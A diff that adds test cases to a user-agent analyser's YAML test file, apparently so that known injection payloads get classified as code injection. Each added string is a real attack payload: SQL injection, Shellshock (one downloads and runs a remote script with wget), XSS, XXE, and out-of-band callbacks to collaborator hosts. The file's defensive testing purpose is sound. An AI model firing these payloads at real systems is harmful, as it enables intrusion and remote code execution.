@@ -553,6 +553,223 @@ config:
       user_agent_string: 'Jfeza4FE'';select pg_sleep(3); --'
     expected: *isCodeInjection
 
+- test:
+    input:
+      user_agent_string: '"$(nslookup hitbnwfgtfmmo82772.bxss.me||perl -e \""gethostbyname(''hitbnwfgtfmmo82772.bxss.me'')\"")"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: "true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || curl -X POST"
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"0\""XOR(if(now()=sysdate(),sleep(16.035),0))XOR\""Z"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"0\""XOR(if(now()=sysdate(),sleep(9),0))XOR\""Z"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"-1\"" OR 2+102-102-1=0+0+0+1 --"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\""+\""A\"".concat(70-3).concat(22*4).concat(103).concat(76).concat(97).concat(68)+(require\""socket\"" Socket.gethostbyname(\""hitep\""+\""dyxcykvwed7ef.bxss.me.\"")[3].to_s)+\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"<bgy xmlns=\""http://a.b/\"" xmlns:xsi=\""http://www.w3.org/2001/XMLSchema-instance\"" xsi:schemaLocation=\""http://a.b/ http://cuayv6m2teif2iswzoxilzq9r0xulk9kxbnydm2.burpcollaborator.net/bgy.xsd\"">bgy</bgy>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"<bnj xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://qrlcskjgqsftzwpaw2uwidnnoeu8i162utkga4z.burpcollaborator.net/foo\""/></bnj>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"class s extends Function{constructor(e){if(super(),d.call(this),h(this,g(e)),0===this.cumulativeWeightIndexPairs.length)throw new Error(\""No user agents matched your filters.\"");return this.randomize(),new Proxy(this,{apply:()=>this.random(),get:(e,t,i)=>{if(e.data&&\""string\""==typeof t&&Object.prototype.hasOwnProperty.call(e.data,t)&&Object.prototype.propertyIsEnumerable.call(e.data,t)){const i=e.data[t];if(void 0!==i)return i}return Reflect.get(e,t,i)}})}}"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"&echo abbzqc$()\\ fsibqs\\nz^xyu||a #'' &echo abbzqc$()\\ fsibqs\\nz^xyu||a #|\"" &echo abbzqc$()\\ fsibqs\\nz^xyu||a #"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"echo avvvrz$()\\ aqqqmm\\nz^xyu||a #'' &echo avvvrz$()\\ aqqqmm\\nz^xyu||a #|\"" &echo avvvrz$()\\ aqqqmm\\nz^xyu||a #"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"|echo aydqau$()\\ spndrl\\nz^xyu||a #'' |echo aydqau$()\\ spndrl\\nz^xyu||a #|\"" |echo aydqau$()\\ spndrl\\nz^xyu||a #"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\"".gethostbyname(lc(\""hitbs\"".\""vizfkxhu5d44c.bxss.me.\"")).\""A\"".chr(67).chr(hex(\""58\"")).chr(105).chr(73).chr(109).chr(75).\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"ggigmu\\z`z''z\""${{%{{\\"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"() { ignored; }; echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6271_rce Output : $((20+60))\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"javascript:/*</script><svg/onload=''+/\""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/0qrnlxud6i5funux3wy1o3lhs8yztnle99wzko\\.burpcollaborator.net/).replace(/\\\\/g,[]))//''>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''+(function(){if(typeof aab4q===\""undefined\""){var a=new Date();do{var b=new Date();}while(b-a<20000);aab4q=1;}}())+''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % vymwj SYSTEM \""http://222pxz6fikhh6p6zfya305xj4aa2fqjee14pt.burpcollab''||''orator.net/\"">%vymwj;]>''),''/l'') from dual)||''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36<esi:include src=\""http://bxss.me/rpb.png\""/>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=009365&r=108649-274&h=108649-099e0-2&\""></script>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''\""`0&nslookup -q=cname 2y18pv3tppwogeka3w8m5jqej5pydp5qtnhi48sx.burpcollaborator.net.&`''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''+(function(){if(typeof i5qmg===\""undefined\""){var a=new Date();do{var b=new Date();}while(b-a<20000);i5qmg=1;}}())+''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % hozmx SYSTEM \""http://1pr7guusgonn7db9uvzlwihda4gx4o6ruviq5gt5.burpcollab''||''orator.net/\"">%hozmx;]>''),''/l'') from dual)||''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"<xxp xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://vyxhzpqlxxmy61wf3711piusvj1dp3d41vrih66.burpcollaborator.net/foo\""/></xxp>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\""+str(__import__(''time'').sleep(9))+__import__(''socket'').gethostbyname(''hitafkttfczcr2a1fa.''+''bxss.me'')+\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % ocyrx SYSTEM \""http://dubjl6z4l0szcpglz74x1umpfgl9966u9i45utj.burpcollab''||''orator.net/\"">%ocyrx;]>''),''/l'') from dual)"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '() { :;}; /bin/bash -c \""wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"() { ignored; }; echo Content-Type: text/plain ; echo ; echo \""bash_cve_2014_6271_rce Output : $((11+70))\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${@print(md5(acunetix_wvs_security_test))}\'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '(for x in {1..200} ; do echo ""for x$x in ; do :""; done; for x in {1..200} ; do echo done ; done) | bash ||%0A/usr/local/bin/curl -X POST https://www.tinfoilsecurity.com/scanner_phone_home/913c8c97-a67a-49bf-811b-c70ab6252eca'
+    expected: *isCodeInjection
+
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\0861x6oxcszin7.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
+    expected: *isCodeInjection
+
+# This used to trigger an NPE
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36{${sleep(20)}}'
+    expected: *isCodeInjection
+
+
+- test:
+    input:
+      user_agent_string: '"\""''></script></textarea><script>alert(108)</script>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\""''></script></textarea><script>alert(11246)</script>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"(select(0)from(select(sleep(12)))v)/*''+(select(0)from(select(sleep(12)))v)+''\""+(select(0)from(select(sleep(12)))v)+\""*/"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\"";print(md5(31337));$a=\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\"";print(md5(acunetix_wvs_security_test));$a=\"""'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"|(nslookup hitsjwnojvvmi77ddb.bxss.me||perl -e \""gethostbyname(''hitsjwnojvvmi77ddb.bxss.me'')\"")"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"`(nslookup hitswcpzhzszb9eda1.bxss.me||perl -e \""gethostbyname(''hitswcpzhzszb9eda1.bxss.me'')\"")`"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '";(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")|(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")&(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=009365&r=103314-15472&h=103314-57586-2&\""></script>"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % aiinc SYSTEM \""http://vtscnxwmimnw54xv5i6172v7gymral99dx8ky8n.burpcollab''||''orator.net/\"">%aiinc;]>''),''/l'') from dual)||''"'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '"\""><script src=https://include.xss.ht></script>"'
+    expected: *isCodeInjection
 
 # Validate false positive edge case that matched the substring "OR NOT" in "honOR NOTe 8"
 - test:
